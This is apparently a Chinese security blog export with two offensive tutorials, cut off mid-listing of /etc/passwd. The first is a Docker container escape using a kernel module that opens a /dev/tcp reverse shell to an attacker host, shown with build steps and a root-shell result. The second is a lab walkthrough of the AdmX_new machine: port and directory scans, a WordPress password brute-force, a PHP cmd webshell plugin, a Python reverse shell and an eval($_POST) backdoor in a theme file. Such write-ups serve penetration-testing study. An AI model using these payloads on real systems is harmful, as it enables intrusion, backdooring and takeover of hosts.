<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@master ~]<span class="comment"># nc -lvvp 4444</span></span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::4444</span><br><span class="line">Ncat: Listening on 0.0.0.0:4444</span><br><span class="line">Ncat: Connection from 172.16.42.151.</span><br><span class="line">Ncat: Connection from 172.16.42.151:37440.</span><br><span class="line">ifconfig</span><br><span class="line">ens33: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.16.42.151  netmask 255.255.255.0  broadcast 172.16.42.255</span><br><span class="line">        inet6 fe80::20c:29ff:fe01:f943  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:01:f9:43  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 206535  bytes 221632693 (211.3 MiB)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="4-6-通过SYS-MODULE逃逸"><a href="#4-6-通过SYS-MODULE逃逸" class="headerlink" title="4.6 通过SYS_MODULE逃逸"></a>4.6 通过SYS_MODULE逃逸</h3><p>exp.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span> <span class="comment">/* Needed by all modules */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span> <span class="comment">/* Needed for KERN_INFO */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span> <span class="comment">/* Needed for the macros */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched/signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/nsproxy.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/proc_ns.h&gt;</span></span></span><br><span class="line"><span class="comment">///&lt; The license type -- this affects runtime behavior</span></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"><span class="comment">///&lt; The author -- visible when you use modinfo</span></span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;Nimrod Stoler&quot;</span>);</span><br><span class="line"><span class="comment">///&lt; The description -- see modinfo</span></span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;NS Escape LKM&quot;</span>);</span><br><span class="line"><span class="comment">///&lt; The version of the module</span></span><br><span class="line">MODULE_VERSION(<span class="string">&quot;0.1&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">escape_start</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> rc;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> *envp[] = &#123;</span><br><span class="line">        <span class="string">&quot;SHELL=/bin/bash&quot;</span>,</span><br><span class="line">        <span class="string">&quot;HOME=/home/cyberark&quot;</span>,</span><br><span class="line">        <span class="string">&quot;USER=cyberark&quot;</span>,</span><br><span class="line">        <span class="string">&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin&quot;</span>,</span><br><span class="line">        <span class="string">&quot;DISPLAY=:0&quot;</span>,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">char</span> *argv[] = &#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>, <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/172.16.42.100/4444 0&gt;&amp;1&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    rc = call_usermodehelper(argv[<span class="number">0</span>], argv, envp, UMH_WAIT_PROC);</span><br><span class="line">    printk(<span class="string">&quot;RC is: %i \n&quot;</span>, rc);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> __exit <span class="title">escape_end</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_EMERG <span class="string">&quot;Goodbye!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">module_init(escape_start);</span><br><span class="line">module_exit(escape_end);</span><br></pre></td></tr></table></figure>

<p>Makefile:</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ifneq</span> (<span class="variable">$(KERNELRELEASE)</span>,)</span><br><span class="line">    obj-m :=exp.o</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    KDIR :=/lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build</span><br><span class="line"><span class="section">all:</span></span><br><span class="line">	make -C <span class="variable">$(KDIR)</span> M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	rm -f *.ko *.o *.mod.o *.mod.c *.symvers *.order</span><br><span class="line"><span class="keyword">endif</span></span><br></pre></td></tr></table></figure>

<p>编译：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  make</span><br><span class="line">make -C /lib/modules/4.19.0-18-amd64/build M=/root/poc/moudle modules</span><br><span class="line">make[1]: 进入目录“/usr/src/linux-headers-4.19.0-18-amd64”</span><br><span class="line">  CC [M]  /root/poc/moudle/exp.o</span><br><span class="line">  Building modules, stage 2.</span><br><span class="line">  MODPOST 1 modules</span><br><span class="line">  CC      /root/poc/moudle/exp.mod.o</span><br><span class="line">  LD [M]  /root/poc/moudle/exp.ko</span><br><span class="line">make[1]: 离开目录“/usr/src/linux-headers-4.19.0-18-amd64”</span><br></pre></td></tr></table></figure>

<p>编译完成后有如下文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜ ls</span><br><span class="line">exp.c  exp.ko  exp.mod.c  exp.mod.o  exp.o  Makefile  modules.order  Module.symvers</span><br></pre></td></tr></table></figure>

<p>在攻击机启动监听</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure>

<p>启动sysmodule环境的容器(这里用busybox，因为要用insmod)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run --name <span class="built_in">test</span> -itd --cap-add=SYS_MODULE --rm busybox</span><br></pre></td></tr></table></figure>

<p>将exp.ko复制到容器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker cp exp.ko <span class="built_in">test</span>:/root/</span><br></pre></td></tr></table></figure>

<p>进入容器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it <span class="built_in">test</span> /bin/sh</span><br></pre></td></tr></table></figure>

<p>执行攻击</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">insmod exp.ko</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@master ~]<span class="comment"># nc -lvvp 4444</span></span><br><span class="line">Ncat: Version 7.50 ( https://n</span><br><span class="line">map.org/ncat )</span><br><span class="line">Ncat: Listening on :::4444</span><br><span class="line">Ncat: Listening on 0.0.0.0:4444</span><br><span class="line">Ncat: Connection from 172.16.42.151.</span><br><span class="line">Ncat: Connection from 172.16.42.151:56732.</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (-1): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">root@vuln:/<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>测试完成后删除模块</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">rmmod <span class="built_in">exp</span>.ko</span><br></pre></td></tr></table></figure>





<h2 id="5-通过内核漏洞进行逃逸"><a href="#5-通过内核漏洞进行逃逸" class="headerlink" title="5. 通过内核漏洞进行逃逸"></a>5. 通过内核漏洞进行逃逸</h2><h3 id="5-1-脏牛提权"><a href="#5-1-脏牛提权" class="headerlink" title="5.1 脏牛提权"></a>5.1 脏牛提权</h3><p>漏洞编号：CVE-2016-5195<br>漏洞名称：脏牛（Dirty COW）<br>漏洞危害：低权限用户利用该漏洞技术可以在全版本Linux系统上实现本地提权<br>影响范围：Linux内核&gt;=2.6.22</p>
<p>该漏洞是 Linux 内核的内存子系统在处理写时拷贝（Copy-on-Write）时存在条件竞争漏洞， 导致可以破坏私有只读内存映射。黑客可以在获取低权限的的本地用户后，利用此漏洞获取 其他只读内存映射的写权限，进一步获取 root 权限。</p>
<p>脏牛提权跟CVE-2018-15664有异曲同工之妙</p>
<p>这里需要重新搭建低版本虚拟机环境就不再复现。</p>
<h2 id="6-总结"><a href="#6-总结" class="headerlink" title="6. 总结"></a>6. 总结</h2><p>本文先讨论了关于容器逃逸相关的一些信息收集手法，然后讨论了挂载敏感目录逃逸的方法，在挂载目录逃逸中又讨论了两种特殊的情况：Docker in Docker和procfs。之后我们我们讨论了利用容器运行时的runC漏洞进行逃逸，再之后我们通过容器的Capabilities权限进行逃逸，其中–privileged参数具有所有的docker Capabilities权限，可以很方便的逃逸，然后分别讨论了在有限Capabilities权限下逃逸的手法，分别对应的特权是：SYS_ADMIN、SYS_PTRACE、SYS_MODULE。最后是内核提权。</p>
<h2 id="7-参考"><a href="#7-参考" class="headerlink" title="7. 参考"></a>7. 参考</h2><ul>
<li><p><a href="https://security.tencent.com/index.php/blog/msg/183">https://security.tencent.com/index.php/blog/msg/183</a></p>
</li>
<li><p>《云原生攻防实践与体系建设》</p>
</li>
<li><p><a href="https://mp.weixin.qq.com/s/WaRECg79Nxx08iekakrlMA">https://mp.weixin.qq.com/s/WaRECg79Nxx08iekakrlMA</a></p>
</li>
<li><p><a href="https://segmentfault.com/a/1190000017543294">https://segmentfault.com/a/1190000017543294</a></p>
</li>
<li><p><a href="https://www.jianshu.com/p/7afb69668280">https://www.jianshu.com/p/7afb69668280</a></p>
</li>
<li><p><a href="https://threezh1.com/2021/02/26/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8Cheat_Sheet/#CVE-2019-5736-runc%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E">https://threezh1.com/2021/02/26/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8Cheat_Sheet/#CVE-2019-5736-runc%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>云原生安全</category>
      </categories>
      <tags>
        <tag>容器安全</tag>
      </tags>
  </entry>
  <entry>
    <title>打靶练习4-AdmX_new</title>
    <url>/%E6%89%93%E9%9D%B6%E7%BB%83%E4%B9%A04-AdmX-new/</url>
    <content><![CDATA[<p>靶机无法获取ip问题 | nmap Ping scan | feroxbuster目录扫描 | burp替换 | wordpress获取shell | 升级full tty | 密码复用提权 | mysql提权</p>
<span id="more"></span>









<h2 id="1-靶机获取不到ip问题"><a href="#1-靶机获取不到ip问题" class="headerlink" title="1. 靶机获取不到ip问题"></a>1. 靶机获取不到ip问题</h2><ul>
<li><strong>进入系统启动菜单</strong></li>
</ul>
<p>​        host+r重启，按shift键进入（也可能是方向上键盘）</p>
<ul>
<li><p><strong>修改内核加载配置项</strong></p>
<p>shift进入后按“e”，进入，修改配置为如下 </p>
<p><img src="../images/pics/%E6%89%93%E9%9D%B6/10.jpg"> </p>
</li>
</ul>
<ul>
<li><p><strong>进入单用户模式</strong></p>
<p>修改好后，按Ctrl+x进入单用户模式（root)；</p>
</li>
<li><p><strong>查看网卡名称</strong></p>
<p><img src="../images/pics/%E6%89%93%E9%9D%B6/11.jpg"> </p>
</li>
</ul>
<ul>
<li><p><strong>修改网络配置的网卡名称</strong></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="comment"># RedHat Linux</span></span><br><span class="line">vi <span class="regexp">/etc/</span>network/interfaces</span><br><span class="line"></span><br><span class="line"><span class="comment"># UBUNTU</span></span><br><span class="line">vi <span class="regexp">/etc/</span>netplan/<span class="number">00</span>-installer-config.yaml</span><br></pre></td></tr></table></figure>

<p>这台机器是ubuntu，所以我们用上面的第二条命令，修改ens33为上面的enp0s17。</p>
<p><img src="../images/pics/%E6%89%93%E9%9D%B6/12.jpg"> </p>
<p>改好后，保存退出即可。</p>
</li>
</ul>
<h2 id="2-探测"><a href="#2-探测" class="headerlink" title="2. 探测"></a>2. 探测</h2><h3 id="nmap-ping-scan"><a href="#nmap-ping-scan" class="headerlink" title="nmap ping scan"></a>nmap ping scan</h3><p>使用nmap的ping扫描进行主机发现</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo</span> nmap -sn <span class="number">172.16.42.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>

<p>扫描结果</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">[root@kali ~]# sudo <span class="keyword">nmap</span> -<span class="keyword">sn</span> <span class="number">172.16</span>.<span class="number">42.0</span>/<span class="number">24</span></span><br><span class="line">Starting Nmap <span class="number">7.91</span> ( http<span class="variable">s:</span>//<span class="keyword">nmap</span>.org ) at <span class="number">2022</span>-<span class="number">11</span>-<span class="number">09</span> <span class="number">01</span>:<span class="number">03</span> EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">172.16</span>.<span class="number">42.1</span></span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.00021</span>s latency).</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">00</span>:<span class="number">50</span>:<span class="number">56</span>:C0:<span class="number">00</span>:<span class="number">08</span> (VMware)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">172.16</span>.<span class="number">42.204</span></span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.00034</span>s latency).</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:<span class="number">8</span>E:<span class="number">28</span>:<span class="number">57</span> (Oracle VirtualBox virtual NIC)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">172.16</span>.<span class="number">42.254</span></span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.00022</span>s latency).</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">00</span>:<span class="number">50</span>:<span class="number">56</span>:FD:C7:E1 (VMware)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">172.16</span>.<span class="number">42.147</span></span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span>.</span><br><span class="line">Nmap done: <span class="number">256</span> IP addresses (<span class="number">4</span> hosts <span class="keyword">up</span>) scanned in <span class="number">27.99</span> seconds</span><br></pre></td></tr></table></figure>

<p>172.16.42.147是kali的ip，所以目标ip就是172.16.42.204</p>
<h3 id="nmap全端口扫描"><a href="#nmap全端口扫描" class="headerlink" title="nmap全端口扫描"></a>nmap全端口扫描</h3><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -p- <span class="number">172.16.42.204</span></span><br></pre></td></tr></table></figure>

<p>扫描结果</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">PORT   STATE SERVICE</span><br><span class="line"><span class="number">80</span>/tcp <span class="built_in">open</span>  <span class="keyword">http</span></span><br></pre></td></tr></table></figure>

<p>端口服务识别</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -p <span class="number">80</span> -sV <span class="number">172.16.42.204</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">80</span>/tcp open  http    Apache httpd <span class="number">2</span>.<span class="number">4</span>.<span class="number">41</span> ((Ubuntu))</span><br></pre></td></tr></table></figure>





<h3 id="feroxbuster目录扫描"><a href="#feroxbuster目录扫描" class="headerlink" title="feroxbuster目录扫描"></a>feroxbuster目录扫描</h3><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">feroxbuster --url http:<span class="regexp">//</span><span class="number">172.16</span>.<span class="number">42.204</span></span><br></pre></td></tr></table></figure>

<p>feroxbuster默认使用seclist字典，需要安装，有点大， 我们这里使用dirb就行了。</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">feroxbuster --url http:<span class="regexp">//</span><span class="number">172.16</span>.<span class="number">42.204</span> -w <span class="regexp">/usr/</span>share<span class="regexp">/dirb/</span>wordlists/common.txt</span><br></pre></td></tr></table></figure>

<p>获取到url: <a href="http://172.16.42.204/wordpress/">http://172.16.42.204/wordpress/</a></p>
<h2 id="3-web入侵"><a href="#3-web入侵" class="headerlink" title="3. web入侵"></a>3. web入侵</h2><p>访问<a href="http://172.16.42.204/wordpress/">http://172.16.42.204/wordpress/</a> </p>
<p>发现加载很慢，</p>
<h3 id="burp替换"><a href="#burp替换" class="headerlink" title="burp替换"></a>burp替换</h3><p>用burp拦截，查看请求记录。发现目标地址是172.16.42.204，发现会请求192.168.159.145</p>
<p><img src="../images/pics/%E6%89%93%E9%9D%B6/13.jpg"></p>
<p>原因是：我们查看第一个请求<a href="http://172.16.42.204/wordpress/">http://172.16.42.204/wordpress/</a>  发现返回包里面硬编码了192.168.159.145地址。</p>
<p>现在需要我们替换掉里面的ip。</p>
<ol>
<li>先清空内容</li>
</ol>
<p><img src="../images/pics/%E6%89%93%E9%9D%B6/14.jpg"></p>
<ol start="2">
<li>修改响应头</li>
</ol>
<p><img src="../images/pics/%E6%89%93%E9%9D%B6/15.jpg"></p>
<ol start="3">
<li><p>修改响应体</p>
<p><img src="../images/pics/%E6%89%93%E9%9D%B6/16.jpg"></p>
</li>
</ol>
<ol start="4">
<li>重新访问，快速加载成功。</li>
</ol>
<h3 id="web密码爆破"><a href="#web密码爆破" class="headerlink" title="web密码爆破"></a>web密码爆破</h3><p>访问后台地址：<a href="http://172.16.42.204/wordpress/wp-admin">http://172.16.42.204/wordpress/wp-admin</a>  （目录扫描获得）</p>
<p>提示admin账号的密码不对，进行破解</p>
<p>使用字典(如下两个都成功)：</p>
<ul>
<li>Web-Fuzzing-Box/Brute/Top/Top100000.txt</li>
<li>SecLists-master/Passwords/xato-net-10-million-passwords-1000000.txt</li>
</ul>
<p>爆破出来密码adam14</p>
<h3 id="wordpress后台获取webshell"><a href="#wordpress后台获取webshell" class="headerlink" title="wordpress后台获取webshell"></a>wordpress后台获取webshell</h3><p>wordpress的三种getshell，低版本media文件上传、Apprearance主题的 php模板、修改/上传插件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Plugin Name: Webshell</span></span><br><span class="line"><span class="comment"> * Plugin URI: https://ShadowFl0w.github.io</span></span><br><span class="line"><span class="comment"> * Description: WP Webshell for Pentest</span></span><br><span class="line"><span class="comment"> * Version: 1.0</span></span><br><span class="line"><span class="comment"> * Author: ShadowFlow</span></span><br><span class="line"><span class="comment"> * Auther URI: https://ShadowFl0w.github.io</span></span><br><span class="line"><span class="comment"> * License: https://ShadowFl0w.github.io</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))</span><br><span class="line">	&#123;</span><br><span class="line">		system(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>压缩上传<code>zip shell.zip shell.php</code>，激活</p>
<p>访问： <a href="http://172.16.42.204/wordpress/wp-content/plugins/shell.php">http://172.16.42.204/wordpress/wp-content/plugins/shell.php</a></p>
<p>执行命令：<code>http://172.16.42.204/wordpress/wp-content/plugins/shell.php?cmd=whoami</code></p>
<h2 id="远程控制"><a href="#远程控制" class="headerlink" title="远程控制"></a>远程控制</h2><h3 id="python3反弹shell"><a href="#python3反弹shell" class="headerlink" title="python3反弹shell"></a>python3反弹shell</h3><p>查看是否存在nc： <code>http://172.16.42.204/wordpress/wp-content/plugins/shell.php?cmd=which%20nc</code></p>
<p>发现存在，那么用nc反弹</p>
<p>这次用python3反弹shell</p>
<figure class="highlight tcl"><table><tr><td class="code"><pre><span class="line">/usr/bin/python3 -c &#x27;import <span class="keyword">socket</span>,subprocess,os;s=<span class="keyword">socket</span>.<span class="keyword">socket</span>(<span class="keyword">socket</span>.AF_INET,<span class="keyword">socket</span>.SOCK_STREAM);s.connect((<span class="string">&quot;172.16.42.147&quot;</span>,<span class="number">4444</span>));os.dup2(s.fileno(),<span class="number">0</span>); os.dup2(s.fileno(),<span class="number">1</span>);os.dup2(s.fileno(),<span class="number">2</span>);import pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure>







<h2 id="升级full-tty"><a href="#升级full-tty" class="headerlink" title="升级full tty"></a>升级full tty</h2><h3 id="修改为bash"><a href="#修改为bash" class="headerlink" title="修改为bash"></a>修改为bash</h3><p>确定存在bash</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">[root@kali ~]# ls <span class="regexp">/bin/</span>bash</span><br><span class="line"><span class="regexp">/bin/</span>bash</span><br></pre></td></tr></table></figure>

<p>因为目标机器是bash，我们是用的zsh，所以切换到bash</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">chsh  -s <span class="regexp">/bin/</span>bash</span><br></pre></td></tr></table></figure>

<p>重启</p>
<p>查看是否切换成功</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">└─<span class="comment"># echo $SHELL</span></span><br><span class="line"><span class="regexp">/bin/</span>bash</span><br></pre></td></tr></table></figure>





<h3 id="升级full-tty-1"><a href="#升级full-tty-1" class="headerlink" title="升级full tty"></a>升级full tty</h3><p>kali监听</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvvp <span class="number">4444</span></span><br></pre></td></tr></table></figure>

<p>重新反弹</p>
<p>将反弹的shell放到后台</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="section">control</span> + z</span><br></pre></td></tr></table></figure>



<p>下一条指令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">stty raw -<span class="built_in">echo</span></span><br></pre></td></tr></table></figure>



<p>将后台的shell放到前台(直接输入fg)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">fg</span></span><br></pre></td></tr></table></figure>



<p>反弹shell中执行如下命令</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">www-data<span class="variable">@wp</span><span class="symbol">:/var/www/html/wordpress</span><span class="variable">$ </span>export SHELL=<span class="regexp">/bin/bash</span></span><br><span class="line">www-data<span class="variable">@wp</span><span class="symbol">:/var/www/html/wordpress</span><span class="variable">$ </span>export TERM=screen</span><br><span class="line">www-data<span class="variable">@wp</span><span class="symbol">:/var/www/html/wordpress</span><span class="variable">$ </span>stty rows <span class="number">38</span> columns <span class="number">116</span></span><br><span class="line">www-data<span class="variable">@wp</span><span class="symbol">:/var/www/html/wordpress</span><span class="variable">$ </span>reset</span><br></pre></td></tr></table></figure>



<h3 id="获取webshell"><a href="#获取webshell" class="headerlink" title="获取webshell"></a>获取webshell</h3><p><code>vi wp-content/themes/twentytwentyone/404.php</code></p>
<p>插入</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line"><span class="built_in">eval</span>($_POST[<span class="string">&#x27;ant&#x27;</span>])<span class="comment">;</span></span><br></pre></td></tr></table></figure>



<p><img src="../images/pics/%E6%89%93%E9%9D%B6/17.jpg"></p>
<p>使用蚁剑连接</p>
<h2 id="密码复用提权"><a href="#密码复用提权" class="headerlink" title="密码复用提权"></a>密码复用提权</h2><p>查看用户<code>cat /etc/passwd</code></p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="symbol">root:</span><span class="symbol">x:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash</span></span><br><span class="line"><span class="symbol">daemon:</span><span class="symbol">x:</span><span class="number">1</span><span class="symbol">:</span><span class="number">1</span><span class="symbol">:daemon</span><span class="symbol">:/usr/sbin</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">bin:</span><span class="symbol">x:</span><span class="number">2</span><span class="symbol">:</span><span class="number">2</span><span class="symbol">:bin</span><span class="symbol">:/bin</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">sys:</span><span class="symbol">x:</span><span class="number">3</span><span class="symbol">:</span><span class="number">3</span><span class="symbol">:sys</span><span class="symbol">:/dev</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">sync:</span><span class="symbol">x:</span><span class="number">4</span><span class="symbol">:</span><span class="number">65534</span><span class="symbol">:sync</span><span class="symbol">:/bin</span><span class="symbol">:/bin/sync</span></span><br><span class="line"><span class="symbol">games:</span><span class="symbol">x:</span><span class="number">5</span><span class="symbol">:</span><span class="number">60</span><span class="symbol">:games</span><span class="symbol">:/usr/games</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">man:</span><span class="symbol">x:</span><span class="number">6</span><span class="symbol">:</span><span class="number">12</span><span class="symbol">:man</span><span class="symbol">:/var/cache/man</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">lp:</span><span class="symbol">x:</span><span class="number">7</span><span class="symbol">:</span><span class="number">7</span><span class="symbol">:lp</span><span class="symbol">:/var/spool/lpd</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">mail:</span><span class="symbol">x:</span><span class="number">8</span><span class="symbol">:</span><span class="number">8</span><span class="symbol">:mail</span><span class="symbol">:/var/mail</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">news:</span><span class="symbol">x:</span><span class="number">9</span><span class="symbol">:</span><span class="number">9</span><span class="symbol">:news</span><span class="symbol">:/var/spool/news</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">uucp:</span><span class="symbol">x:</span><span class="number">10</span><span class="symbol">:</span><span class="number">10</span><span class="symbol">:uucp</span><span class="symbol">:/var/spool/uucp</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">proxy:</span><span class="symbol">x:</span><span class="number">13</span><span class="symbol">:</span><span class="number">13</span><span class="symbol">:proxy</span><span class="symbol">:/bin</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line">www-<span class="symbol">data:</span><span class="symbol">x:</span><span class="number">33</span><span class="symbol">:</span><span class="number">33</span><span class="symbol">:www-data</span><span class="symbol">:/var/www</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">backup:</span><span class="symbol">x:</span><span class="number">34</span><span class="symbol">:</span><span class="number">34</span><span class="symbol">:backup</span><span class="symbol">:/var/backups</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">list:</span><span class="symbol">x:</span><span class="number">38</span><span class="symbol">:</span><span class="number">38</span><span class="symbol">:Mailing</span> List <span class="symbol">Manager:</span>/var/<span class="symbol">list:</span>/usr/sbin/nologin</span><br><span class="line"><span class="symbol">irc:</span><span class="symbol">x:</span><span class="number">39</span><span class="symbol">:</span><span class="number">39</span><span class="symbol">:ircd</span><span class="symbol">:/var/run/ircd</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">gnats:</span><span class="symbol">x:</span><span class="number">41</span><span class="symbol">:</span><span class="number">41</span><span class="symbol">:Gnats</span> Bug-Reporting System (admin)<span class="symbol">:/var/lib/gnats</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">nobody:</span><span class="symbol">x:</span><span class="number">65534</span><span class="symbol">:</span><span class="number">65534</span><span class="symbol">:nobody</span><span class="symbol">:/nonexistent</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line">systemd-<span class="symbol">network:</span><span class="symbol">x:</span><span class="number">100</span><span class="symbol">:</span><span class="number">102</span><span class="symbol">:systemd</span> Network Management,,,<span class="symbol">:/run/systemd</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line">systemd-<span class="symbol">resolve:</span><span class="symbol">x:</span><span class="number">101</span><span class="symbol">:</span><span class="number">103</span><span class="symbol">:systemd</span> Resolver,,,<span class="symbol">:/run/systemd</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line">systemd-<span class="symbol">timesync:</span><span class="symbol">x:</span><span class="number">102</span><span class="symbol">:</span><span class="number">104</span><span class="symbol">:systemd</span> Time Synchronization,,,<span class="symbol">:/run/systemd</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">messagebus:</span><span class="symbol">x:</span><span class="number">103</span><span class="symbol">:</span><span class="number">106</span><span class="symbol">:</span><span class="symbol">:/nonexistent</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">syslog:</span><span class="symbol">x:</span><span 